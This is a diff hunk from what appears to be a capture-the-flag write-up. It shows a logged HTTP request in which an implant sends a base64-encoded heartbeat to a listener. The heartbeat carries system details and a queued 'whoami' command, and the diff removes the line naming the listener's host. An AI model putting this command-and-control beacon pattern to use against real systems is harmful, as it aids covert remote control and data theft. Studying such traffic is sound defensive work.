@@ -55,7 +55,6 @@ After some seconds an http request comes in written with python's requests packa
 
 ```
 GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDhUMTU6NDQ6MDEuODkyOTY5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
-Host: 10.9.6.179:81
 User-Agent: python-requests/2.22.0
 Accept-Encoding: gzip, deflate
 Accept: */*
